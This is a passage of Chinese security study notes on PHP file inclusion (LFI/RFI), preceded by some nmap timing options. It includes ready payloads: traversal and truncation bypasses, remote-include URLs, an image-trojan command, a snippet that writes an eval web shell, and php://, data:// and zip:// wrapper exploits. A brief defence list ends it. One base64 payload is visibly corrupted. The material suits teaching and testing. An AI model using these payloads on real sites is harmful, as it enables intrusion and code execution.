- `--min-parallelism <numprobes>`：设置最小并行探测数。
- `--max-parallelism <numprobes>`：设置最大并行探测数。
- `--min-rtt-timeout <time>`：设置最小 RTT 超时时间。
- `--max-rtt-timeout <time>`：设置最大 RTT 超时时间。
- `--initial-rtt-timeout <time>`：设置初始 RTT 超时时间。
- `--max-retries <tries>`：设置最大重试次数。
- `--host-timeout <time>`：设置主机超时时间。
- `--scan-delay <time>`：设置探测之间的延迟时间。
- `--max-scan-delay <time>`：设置最大探测延迟时间。
- `--min-rate <number>`：设置每秒最小扫描速率。
- `--max-rate <number>`：设置每秒最大扫描速率。

#### 10. **高级选项 (Advanced Options)**

- `--script-updatedb`：更新脚本数据库。
- `--resume <filename>`：从日志文件恢复扫描。
- `--noninteractive`：禁止用户交互。
- `--defeat-rst-ratelimit`：通过发送多个 SYN 探测来绕过目标主机的 RST 速率限制。

------



# 文件包含

#### 常见的文件包含函数

- 概念:程序开发人员通常会把`可重复使用的函数`写到单个文件中,在使用某个函数的时候,`直接调用此文件`,无需再次编写
- 原因:为了代码更灵活,通常会把`被包含的文件设置为变量`,进行`动态调用`,从而导致客户端可以`调用任意文件`,造成文件包含漏洞.动态包含的`文件路径参数`,客户端可控

- include() -->找不到被包含的文件时之产生`警告`,脚本将`继续执行`
- include_once() -->和include类似,唯一区别是如果该文件中的代码`已经被包含`,则不会被`再次包含`
- require() -->找不到被包含的文件时会产生`致命的错误`,并`停止脚本`
- require_once() -->和require类似,唯一区别是如果文件被包含则不会被再次包含
- `require`和`include`的区别:使用`require`时,只要`程序执行`则`立即调用文件`.而`include`只有`程序执行`到`该函数`才会被调用
- 其它用于包含的函数:`highlight_file()`,`show_source()`,`readfile()`,`file_get_contents()`,`fopen()`,`file()`

```php
//经典代码,对$_GET['filename']参数没有经过严格的过滤,直接带入了include()函数,攻击者可以修改$_GET['filename']的值,加载其它文件,执行非预期的操作
<?php
$filename=$_GET['filename'];
include($filename)
?>

//图片马制作
copy /b 1.jpg + shell.php image_with_payload.jpg
```

------



#### 分类

- 主要包括`本地文件包含(LFI)`和`远程文件包含(RFI)`

- 简单来说,本地文件包含可以`读取`和`打开本地文件`,远程文件包含(http,ftp,php伪协议)就是可以`远程加载文件`

- `包含条件`:allow_url_fopen=On(php.ini中进行配置,该选项默认为on)->`本地文件包含不受影响`&&用户可以`动态控制变量`

- ```php
  //无限制本地文件包含漏洞经典代码
  <?php
  $filename=$_GET['filename'];
  include($filename);
  ?>
  ```

------



#### 本地文件包含(LFI)

- `绝对路径`读取本地host文件-->`?action=C:/Windows/System32/drivers/etc/hosts`

- `相对路径`读取本地host文件-->`?action=..//..//..///..//..//..//..//..//windows/system32/drivers/etc/hosts`

- 包含图片木马:`?action=./test.jpg`

- `有限制`本地文件包含漏洞`绕过`

- ```php
  <?php
  $filename=$_GET['filename'];
  include($filename.".php");
  ?>
      
  //绕过方法
   1.%00截断
      - 条件:magic_quotes_gpc=Off php版本<5.3.4
      - 获取phpinfo.php文件-->  ?action=phpinfo.php%00
          
   2.路径长度截断
      - 条件:windows下长于198字符,超出部分会被丢弃
      - ?action=phpinfo.php/./././././././././././././././././././././././././././././././././././././
          
   3.点号截断
      - 条件:windows系统,点号需要长于197
      - ?action=phpinfo.php.............................................................................
          
  ```

------

#### 远程文件包含(RFI)

- 指的是能够包含远程服务器上的文件并执行,可以通过http(s)或者ftp等方式,远程加载文件

- 危害:由于远程服务器的文件是我们可控的,因此漏洞一旦存在漏洞危害性很大

- 包含`条件`:

  - allow_url_include=On (默认为OFF,需要在php.ini中手动打开)
  - allow_url_fopen=On  (是否允许打开远程文件)
  - 用户可以`动态控制变量`

  ```php
  //举例
  //通过http协议加载目标机中的info.php文件
  [url]?path=http://ip/info.php	
  
  //通过ftp协议加载目标机中的info.php文件
  [url]?path=ftp://用户名:密码@ip/info.php	
  
  //绕过
  1.问号绕过
      - ?action=http://192.168.1.1/phpinfo.php?
  2.#号绕过
      - ?action=http://192.168.1.1/phpinfo.php%23
  3.空格绕过
      - ?action=http://192.168.1.1/phpinfo.php%20
  ```

------

#### 漏洞利用

- 端口探测:url=dict://ip:`80`

- 包含上传的getshell-->上传图片马

- 包含日志文件getshell-->为了避免在web中进行url编码,进行抓包修改,或者`构造报错信息写错误日志`

- 远程包含文件写shell

- ```php
  //在文件夹下会看到生成shell.php,内容为<?php eval($_POST[1]);?>,当直接包含图片时,代码就会被执行
  <?php
  fputs(fopen('shell.php','w'),'<?php eval($_POST[1]);?>');
  ?>
  ```

- 使用`php伪协议`getshell

------

#### php伪协议

- php伪协议就是`支持的协议`与`封装协议`

- | file:// |  访问本地文件系统   |
  | :-----: | :-----------------: |
  | http:// |   访问http(s)网址   |
  | ftp://  |   访问ftp(s),URLS   |
  | php://  | 访问各个输入/输出流 |
  | zlib:// |       压缩流        |
  | data:// |    数据(RFC2397)    |
  | rar://  |         RAR         |

- `file://协议`

  - 1.用途:访问本地系统文件
  - 2.使用条件:allow_url_fopen:off/on  allow_url_include:off/on	 -->file://在两个配置默认为off可正常使用
  - 3.使用方法:file://文件的绝对路径和文件名
  - 4.举例:[?path=file://c:/windows/system32/drivers/etc/hosts]

- `php://filter`

  - 1.用途:常用于读取文件/源码
  - 2.使用条件:`allow_url_fopen:off/on`,`allow_url_fopen:off/on`两个均为`off`情况下是可以使用的
  - 3.使用:[?path=php://filter/read=convert.base64-encode/resource=文件.php]
  - 4.注意:通过指定末尾的文件,可以读取base64`加密`后的文件源码,之后再base64`解码`.虽然不能直接获取到shell,但是能读取`敏感信息`
  - php://filter协议和file://协议的区别:`file`协议`只能`使用`绝对路径`,`fileter`协议相对绝对`均可`

- `php://input`

  - 用途:可以访问请求的原始数据的只读流,将`post请求中的数据作为php代码执行`
  - 使用条件:allow_url_fopen:off/on,allow_url_include:`on`
  - 使用方法:?file=php://input
  - [POST]:<?php phpinfo()?> (执行post data中的内容)

  ![image-20240907163422325](./assets/image-20240907163422325.png)

- `data://`

  - 用途:执行接收到的数据中包含的php代码
  - 使用条件:allow_url_fopen:`on`,allow_url_include=`on`
  - 使用方法:?file=data:text/plain,<?php phpinfo();?>
  - --------?file=data:text/plain;base64,PD9waHA工程GhwaWmbygpPz4=
  - --------?file=data://text/plain,<?php phpinfo();?>
  - http://192.168.1.1/include.php?file=data://text/plain,<?=phpinfo();?>

- `zip://`

  - 用途:读取压缩包内的文件(绝对/相对路径)如果包含php代码直接执行
  - 使用条件:allow_url_fopen:off   allow_url_include:off
  - 使用方法:zip://archive.zip#dir/file.txt
  - --------zip://[压缩文件绝对/相对路径]#[压缩文件内的子文件名]
  - --------?file=zip://D:/www/file.zip%23phpcode.txt
  - --------?file=zip://D:/www/file.jpg%23phpcode.txt
  - http://192.168.1.1/include.php?file=zip://shell.zip%23shell.txt

- `phar://`

  - 用途:读取压缩文件内的文件(相对/绝对路径)
  - 使用条件:allow_url_fopen:off     allow_url_include:off
  - 使用方法:?file=phar://D:/phpstudy/www/fileinclude/test.zip/phpinfo.txt
  - --------?file=phar://test.zip/phpinfo.txt
  - http://192.168.1.1/include.php?file=phar://shell.zip/shell.txt

- `compress.bzip2://`

  - 用途:读取压缩包内的文件(相对/绝对路径)	
  - 使用条件:allow_url_fopen:off    allow_url_include:off
  - 使用方法:?file=compress.bzip2://shell.txt.bz2
  - Bzip2 -k shell.txt
  - http://192.168.1.1/include.php?file=compress.bzip2://shell.txt.bz2

- `compress.zlip://`

  - 用途:读取压缩包内的文件(相对/绝对)
  - 使用条件:allow_url_fopen:off    allow_url_include:off
  - 使用方法:?file=compress.zlib://shell.zip#shell.txt
  - http://192.168.1.1/include.php?file=compress.zlib://shell.zip#shell.txt

- 其它

- ![image-20240907165822662](./assets/image-20240907165822662.png)

------

#### 文件包含漏洞防御

- 1.严格判断包含中的参数是否外部可控
- 2.路径限制
- 3.包含文件验证
- 4.尽量不要使用`动态包含`,可以在需要包含的页面固定写好
- 5.php中可以使用`open_basedir`配置限制访问
- 6.过滤`.`,`/`,`/`等
- 7.禁止服务器远程文件包含

